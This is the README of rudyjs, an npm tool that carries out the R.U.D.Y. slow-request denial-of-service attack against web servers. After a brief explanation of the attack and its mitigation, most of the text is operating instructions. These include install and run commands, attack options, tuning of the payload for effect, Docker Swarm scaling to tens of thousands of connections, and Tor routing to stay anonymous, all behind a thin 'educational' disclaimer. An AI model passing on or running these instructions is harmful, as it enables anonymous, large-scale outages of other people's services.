# rudyjs ( R-U-DEAD-YET ? )
## RUDY DDOS Attack Implementation on Node.js
### Scalable Lightweight R-U-D-Y DDOS Attack using Tor Proxy
### Difficult to detect low-and-slow DDOS Attack 

[![NPM](https://nodei.co/npm/rudyjs.png?downloads=true&downloadRank=true&stars=true)](https://nodei.co/npm/rudyjs/)


[![Build Status](https://travis-ci.org/sahilchaddha/rudyjs.svg?branch=master)](https://travis-ci.org/sahilchaddha/rudyjs)
[![Build Status](https://semaphoreci.com/api/v1/projects/be75e13b-9b1c-43eb-8350-1a652fe84f03/1950351/badge.svg)](https://semaphoreci.com/sahilchaddha-96/rudy)
[![CircleCI](https://circleci.com/gh/sahilchaddha/rudyjs/tree/master.svg?style=svg)](https://circleci.com/gh/sahilchaddha/rudyjs/tree/master)
[![CodeFactor](https://www.codefactor.io/repository/github/sahilchaddha/rudyjs/badge)](https://www.codefactor.io/repository/github/sahilchaddha/rudyjs)
[![npm](https://img.shields.io/npm/v/rudyjs.svg)](https://www.npmjs.com/package/rudyjs)
[![GitHub release](https://img.shields.io/github/release/sahilchaddha/rudyjs.svg)](https://github.com/sahilchaddha/rudyjs)
[![npm](https://img.shields.io/npm/dm/rudyjs.svg)](https://www.npmjs.com/package/rudyjs)

### What is a R.U.D.Y. attack?
‘R U Dead Yet?’ or R.U.D.Y. is a denial-of-service attack tool that aims to keep a web server tied up by submitting form data at an absurdly slow pace. A R.U.D.Y. exploit is categorized as a low-and-slow attack, since it focuses on creating a few drawn-out requests rather than overwhelming a server with a high volume of quick requests. A successful R.U.D.Y. attack will result in the victim’s web server becoming unavailable to legitimate traffic.

### How does a R.U.D.Y. attack work ?
The tool breaks down the payload into packets as small as 1 byte each, sending these packets to the server at randomized intervals of around 10 seconds each.
The tool continues submitting data indefinitely. The web server will keep the connection open to accept the packets, since the `behavior of the attack is similar to that of a user with a slow connection speed submitting form data`. Meanwhile the web server’s capacity to handle legitimate traffic is impaired.

The R.U.D.Y. tool can simultaneously create several of these slow requests all targeting one web server. Since web servers can only handle so many connections at once, it’s possible for the R.U.D.Y. attack to tie up all available connections, meaning any legitimate users trying to access the web server will be denied service. Even a robust web server with a high number of connections available can be taken down by R.U.D.Y. via a network of computers conducting attacks simultaneously, this is known as a Distributed Denial-of-Service (DDoS) attack.

*HTTP headers are key/value pairs that are sent with any HTTP request or response, and they provide vital information such as the HTTP version being used, what language the content is in, how much content is being delivered, etc.

### What makes R.U.D.Y difficult to detect ?
Because slow and low attacks are carried out much more subtly than traditional denial-of-service attacks, they can be hard to detect, but protections can be put in place to prevent them.

### How to stop R.U.D.Y. attacks
One such prevention measure is to set stricter connection timeout intervals on a web server, meaning that the slowest connections will be severed. This solution comes with a side effect: legitimate users with slow Internet connections could be denied service by the server. Alternately a reverse-proxy solution, such as Cloudflare’s DDoS protection, can filter out low-and-slow attack traffic like R.U.D.Y. attacks, without disconnecting legitimate users.
 
[Source](https://www.cloudflare.com/learning/ddos/ddos-attack-tools/r-u-dead-yet-rudy/)


**Quick Disclaimer**: This information is for educational purposes only and should not be used with malicious intent. Also, the following guide has been tested only for Mac and Ubuntu, minor differences might exist on other OS. For Educational/Penetration Testing Purposes Only (Mitigating RUDY DDos Attacks) 

### Todo :

- [ ] Crawl HTML Page to automate attack vulnerable HTML Forms.

## Installation :

```
 $ npm install -g rudyjs
```

### Usage :

```
 $ rudy
```

### Sample Usage :

```
 $ rudy -t "http://localhost:3000" -d 5 -n 500 --useTor --torUrl "127.0.0.1" --torPort 9051 -m "GET"
```

The above command runs RUDY DDos Attack on `http://localhost:3000` with 5 seconds delay & 500 requests

### Options :

| Command            | Type | Default | Description                                           |
|--------------------|------|---------|-------------------------------------------------------|
| -t, --target  (string)| Required | http://localhost:8080 | Target URL to attack                      |
| -l, --length  (number)| Optional | 1048576 Bytes (1 Mb) | Size of Payload (Bytes)           |
| -n, --numberOfConnections  (number)           | Optional | 500 | Number of Max Connections|
| -m, --method  (string)       | Optional | POST | HTTP Request Method|
| -d, --delay  (number)       | Optional | 5 seconds | Delay between each Bytes sent (seconds)|
| -v, --verbose       | Optional | false | Enable Verbose logs|
| -p, --useTor       | Optional | false | Use Tor Proxy|
| -u, --torUrl  (string)      | Optional | 127.0.0.1 | Custom Tor Server URL|
| -o, --torPort  (number)       | Optional | 9050 | Custom Tor Port|


### Generate Payload : 

```
 $ rudy generatePayload <charCount>
```

Usage : 

```
 $ rudy generatePayload 2
```

`generatePayload` will generate dummy payload of specific character count.Keep character count as low as possible for rudy to be effective. Smaller the payload size will keep the HTTP Socket Connection longer. The Server assumes the client has slow internet connection and will ke the thread blocked.

### Docker : Automating Multiple Attacks

Typically a single attack can run upto 2000-5000 simultaneous requests (Depending upon amount of RAM the machine has). You can also run 15000-25000 simultaneous requests using docker.

You can create docker image from supplied Dockerfile and run the container image multiple times or can use docker swarm.

You can edit the Dockerfile to update your attack configuration.

Creating Docker Image : 

```
 $ docker build -t sahilchaddha/rudy .
```

Running Docker Image : 

```
 $ docker run -d sahilchaddha/rudy
```

Reading Docker Logs :

```
 # Get container ID
 $ docker ps

 # Print app output
 $ docker logs <container id>

 # Example
    > node dist/cli.js "-t" "http://localhost:3000/" "-v" "-d" "5" "-n" "1"

    ____       _   _       ____  _____    _    ____     __   _______ _____   ___
    |  _ \     | | | |     |  _ \| ____|  / \  |  _ \    \ \ / / ____|_   _| |__ \
    | |_) |____| | | |_____| | | |  _|   / _ \ | | | |____\ V /|  _|   | |     / /
    |  _ <_____| |_| |_____| |_| | |___ / ___ \| |_| |_____| | | |___  | |    |_|
    |_| \_\     \___/      |____/|_____/_/   \_\____/      |_| |_____| |_|    (_)

    Author : Sahil Chaddha
    Website: http://www.sahilchaddha.com
    Github : https://www.github.com/sahilchaddha
    Thu May 10 2018 14:58:02 GMT+0800 (+08) *** VERBOSE ::: Logger ::: Logger set to Verbose ***
    Thu May 10 2018 14:58:02 GMT+0800 (+08) *** INFO ::: Rudy_Service ::: Attack Started at http://localhost:3000/ With Workers : 1 ***
```

Docker Swarm : Automating Monitoring of multiple Docker images : 

Setting up Docker Swarm : 

```
 $ docker swarm init
 $ docker swarm join --token <Token From Init Command>
```

Creating and Scaling a Service :

```
 $ docker build -t sahilchaddha/rudy .  //[Only do this if you made changes to the Dockerfile]
 $ docker service create --name <serviceName> --detach=false sahilchaddha/rudy
 $ docker service ls   //[Can see 1/1 copy running]
 $ docker service scale <serviceName>=10 // 10 instances will be created of rudy
 $ docker service ls   //[Doing this multiple times you can see the # of copies increasing]
 $ docker service rm <serviceName> // To remove service
```

This will result in creating 10 instances of rudy attack running with 2000 connections will result in 20,000 connections. This can also lead to consuming lot of memory.

### Staying Anonumous : 

Use `-p, --useTor` to make requests using tor node.
IP Address will be anonymous (tor exit node)

Its preferable to use tor or ssh tunnel

### Developer : 

### Installation : 

```
 $ git clone https://github.com/sahilchaddha/rudyjs.git && cd rudyjs
 $ npm install
 $ npm run build
```

### Starting : 

```
 $ npm run start // For Dist
 $ npm run startTs // For src
```

### Contribution :

Please run lint before creating a PR 

```
    $ npm run lint
```

### Troubleshooting : 

#### 413 Payload too large : 

This Error occurs when HTTP server denies requests with heavy payload. Reduce `packet_len` property to 1MB or lower.

#### 405 Not Allowed : 

This HTTP Error represents that HTTP METHOD ("GET"/"POST") is not allowed on the target URL. Try changing URL to another endpoint or change HTTP METHOD.

### Author : 

Sahil Chaddha